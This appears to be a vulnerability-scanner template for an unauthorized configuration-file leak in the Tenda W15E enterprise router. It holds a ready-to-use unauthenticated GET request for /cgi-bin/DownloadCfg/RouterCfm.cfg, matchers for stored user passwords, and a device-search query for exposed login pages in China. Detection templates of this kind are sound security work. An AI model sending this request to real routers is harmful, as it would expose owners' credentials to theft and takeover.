expression: r0()
id: tenda-w15e-routercfm-cfg-config-leak
info:
  author: zan8in
  description: "Tenda \u4F01\u4E1A\u7EA7\u8DEF\u7531\u5668 RouterCfm.cfg \u914D\u7F6E\
    \u6587\u4EF6\u53EF\u5728\u672A\u6388\u6743\u7684\u60C5\u51B5\u4E0B\u88AB\u8BFB\
    \u53D6\uFF0C\u5BFC\u81F4\u8D26\u53F7\u5BC6\u7801\u7B49\u654F\u611F\u4FE1\u606F\
    \u6CC4\u6F0F\ntitle==\"Tenda | Login\" && country=\"CN\"\n"
  name: "Tenda W15E\u4F01\u4E1A\u7EA7\u8DEF\u7531\u5668 RouterCfm.cfg \u914D\u7F6E\
    \u6587\u4EF6\u6CC4\u6F0F\u6F0F\u6D1E"
  reference:
  - http://wiki.peiqi.tech/wiki/iot/Tenda/Tenda%20W15E%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8%20RouterCfm.cfg%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.html
  severity: high
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'sys.userpass=')
      && response.body.bcontains(b'sys.userpass.decode.pwd=')
    request:
      method: GET
      path: /cgi-bin/DownloadCfg/RouterCfm.cfg
